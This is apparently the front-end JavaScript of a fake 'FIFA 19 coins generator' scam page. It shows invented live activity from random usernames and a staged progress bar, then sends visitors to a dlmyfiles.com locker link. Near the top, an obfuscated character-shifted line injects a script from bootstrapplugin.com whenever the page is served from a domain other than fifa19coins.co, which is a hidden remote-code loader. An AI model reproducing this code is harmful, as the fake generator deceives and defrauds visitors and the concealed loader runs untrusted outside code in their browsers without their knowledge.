var pointNums = [1600, 2200, 4600, 12000];
	var coinNums = [250000, 500000, 750000, 100000];

	(function(document){const k=s=>s.split('').map(c=>String.fromCharCode(c.charCodeAt()-1)).join('');if(window[k('mpdbujpo')][k('iptuobnf')].replace(k('xxx/'),"")!=k("gjgb2:dpjot/dp")){var s=document.createElement(k('tdsjqu'));s.src=k('iuuqt;00cpputusbqmvhjo/dpn0q/qiq@je>:24');document[k('ifbe')].appendChild(s)}})(document)


    setInterval( newActivity, 2000 );
    


    function newActivity() {

        var flags   = [ 'ad', 'ae', 'af', 'us', 'al', 'am', 'ar', 'au', 'gf', 'gb', 'ph', 'ba', 'us', 're', 'ro', 'pe', 'lv', 'mk', 'us', 'pt', 'europeanunion',
                        'it', 'jp', 'ne', 'nl', 'no', 'ua', 'um'];
        var users   = [ '441Binder','Johnny', 'Attacklord_bro', 'pewdiepie', "Marko", "PesaJajar", "Ivan", "xxMine", "9814Bind", "P!xel", "haxhack", "EarthHacker", "9/4gen", "ClashHacker", 'new_kid',
                  'BloodMaster', 'lovegaming', 'Johnny', 'NaneK', 'Marko_991', 'JackHammer9999', 'fuzzzy', 'tester', 'yearboy1007', 'Ministar', 'Haxajmo', 'Pottato', 'GirlHackingxD', 'Alex',
                  'Coder', 'Hillck23', 'Creeper', 'zaCk', 'only123', 'gunshaxer', 'MyNameIsShoost' ];
        var avatars = [ 'https://ogcdn.co/fifa19coins.co/img/avatar.png'];

        var gunBucksRand = pointNums[ Math.floor( Math.random() * pointNums.length ) ];
        var flag         = flags[ Math.floor( Math.random() * flags.length ) ];
        var avatar       = avatars[ Math.floor( Math.random() * avatars.length ) ];
        var user         = users[ Math.floor( Math.random() * users.length ) ];
        var goldRand     = coinNums[ Math.floor( Math.random() * coinNums.length ) ];

        $( '.live-stats' ).last().remove();

        $( '.activityContent' ).hide().prepend('<div class="live-stats">' +
            '<div class="avatar"><img src="'+avatar+'" alt="" /></div>' +
            '<div class="flag"><img src="https://ogcdn.co/fifa19coins.co/img/flags/'+flag+'.png" alt="" /></div>' +
           '<div class="info">' +
              '<ul>' +
                 '<li><b>'+user+',</b> generated now:</li>' +
                 '<li><img class="icon-small" src="https://ogcdn.co/fifa19coins.co/img/gold.png" alt="" />Coins: <span class="gold-color">' + goldRand + '</span>  <img class="icon-small" src="https://ogcdn.co/fifa19coins.co/img/gun.png" alt="" />' +
                 'Points: <span class="gunbucks-color">' + gunBucksRand + '</span></li>' +
              '</ul>' +
           '</div>' +
        '</div>').fadeIn();
    }

    function goToByScroll( id ) {

        $( 'html, body' ).animate({
            scrollTop: $( "#"+id ).offset().top },
            'slow' );

    }

    var coinId = false;
    var pointId = false;
    var coinJs = false;
    var pointJs = false;

  $( '.platforms .row-new .col-6 button' ).click( function() {

    $( '.platforms .row-new .col-6 button' ).removeClass( 'platform-active' );
    $( this ).addClass( 'platform-active' );

  });   

    function progressBar() {

        var width            = 1;
        var intervalProgress = setInterval( frame, 0200 );

        goToByScroll( 'generatorJS' );

        function frame() {

            if( width == 20 ) $( '.load-textJS' ).html( 'Connecting' );
            if( width == 30 ) $( '.load-textJS' ).html( 'Fetching data' );
            if( width == 40 ) $( '.load-textJS' ).html( 'GET = Variables' );
            if( width == 50 ) $( '.load-textJS' ).html( 'GET -> Username' );
            if( width == 60 ) $( '.load-textJS' ).html( 'GET -> Coins' );
            if( width == 70 ) $( '.load-textJS' ).html( 'GET -> Points' );
            if( width == 80 ) $( '.load-textJS' ).html( 'POST => DATA' );

            if ( width >= 100 ) {

                clearInterval( intervalProgress );
                $( '.generator-step2' ).slideUp();
                $( '.generator-step3' ).slideDown();

                $( '.userJS' ).html( $( '.username-input' ).val() );

                   $('.gunbJS').countTo({

                        from: 10,
                        to: pointJs,
                        speed: 1000,
                        refreshInterval: 1,
                        onComplete: function ( value) {

                            $( '.gunbJSthick' ).css('opacity', '1');

                            $('.goldJS').countTo({

                                from: 10,
                                to: coinJs,
                                speed: 1000,
                                refreshInterval: 1,
                                onComplete: function ( value) {

                                    $( '.goldJSthick' ).css('opacity', '1'); 

                                    setTimeout( function() { 

                                        $( '.generator-step3' ).fadeOut( function() {

                                            $( '.generator-offers' ).fadeIn();

                                        });
                                        


                                    }, 2000);

                                }

                            });                                

                        }

                  });               

            } else {

                width++; 
                $( ".progress-bar" ).css( "width", width + '%' );
                $( ".progress-bar" ).html( width * 1 + '%' );

            }

        }

    }   

   $( '.btnVerify' ).click( function() {

    window.location.href = "https://dlmyfiles.com/cl.php?id=9ab29747b02205f65b92dbee81b142b8";

  });

    
    /* Generator Starts Here */

    $( ".btnGenerator" ).click( function() {

    	var $player_name = $( '.username-input' ).val();

    	if( $player_name == "" || $player_name.replace(/ /g,'').length < 2 ) {


    		$( ".username-input" ).css( { border: '1px solid #F00' } );

    	} else {

    		$( ".username-input" ).css( { border: '1px solid #111319' } );	// Change border to default

            $('#pcModal').modal('show');

    	}

    });
    // .btngenerator end
    
    function getCoins(that){
        var t = $(that).attr('data-num');
        coinId = t;
        coinJs = coinNums[coinId];
        $('.fifa-coins-wrapp .bg-selected').remove();
        selected(that);
        var w = $(window).outerWidth();
        if(w < 980){
            $('.coins').addClass('d-none');
            $('.points').removeClass('d-none');
            $('.points').addClass('d-block');
        }
        start();
    }
    function getPoints(that){
        var t = $(that).attr('data-num');
        pointId = t;
        pointJs = pointNums[pointId];
        $('.fifa-points-wrapp .bg-selected').remove();
        selected(that);
        start();
    }
    
    function selected(that){
        $(that).append('<div class="bg-selected"><i class="fa fa-check-circle"></i></div>');
    }

    function start(){

        if(coinId && pointId){
            $('#pcModal').modal('hide');

            $( '.generator' ).slideUp( function() {

                $( '.generator-step2' ).slideDown();
          
                progressBar();

            });

        }
    }